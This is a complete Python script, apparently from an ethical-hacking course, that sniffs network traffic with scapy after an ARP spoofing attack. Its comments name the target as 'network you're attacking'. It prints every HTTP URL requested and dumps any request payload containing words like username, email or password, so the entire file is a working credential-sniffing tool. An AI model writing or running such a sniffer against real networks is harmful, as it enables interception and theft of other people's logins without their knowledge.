#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

# read intercepted packets
# first you start arp_spoof then packet_sniffer
# it will read the most interesting packets

# !!! for http only (not for https) !!!


def get_url(packet):
    return str(packet[http.HTTPRequest].Host, "utf-8") + str(packet[http.HTTPRequest].Path, "utf-8")


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load, "utf-8")

        keywords = ["username", "user", "login", "email", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request --> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password --> " + login_info + "\n\n")




def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # filter: udp, atp, port 80, etc...


sniff("eth0")  # eth0 - network you're attacking (can be anything, check it first)
